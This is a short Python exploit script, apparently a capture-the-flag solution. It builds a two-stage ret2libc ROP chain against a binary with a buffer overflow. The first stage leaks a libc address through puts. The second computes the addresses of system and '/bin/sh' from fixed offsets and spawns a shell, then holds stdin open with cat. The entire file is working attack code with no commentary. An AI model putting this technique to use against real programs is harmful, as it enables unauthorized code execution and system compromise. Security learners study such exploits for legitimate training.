import struct
import sys
import os
import time
def w(s):
    sys.stdout.buffer.write(s)
    sys.stdout.flush()
def wq(qword):
    w(struct.pack('<Q', qword))
w(b"(token)\n")
time.sleep(5)

w(b"1000000\n")
for i in range(0x11):
    w(b"%08x"% i)
wq(0x4013c3) # pop rdi; ret
wq(0x404038)
wq(0x401040) # puts
wq(0x4012df) # main
w(b"\n")

base = 0x7ffff7e28e10
base = int(input(),16)
sh = base - 0x64e10 + 0x1b75aa
system = base - 0x64e10 + 0x55410 + 0x4

w(b"1000000\n")
for i in range(0x11):
    w(b"%08x"% i)
wq(0x4012a4) # ret //align stack
wq(0x4013c3) # pop rdi; ret
wq(sh)
wq(system)
w(b"\n")

os.system("cat")
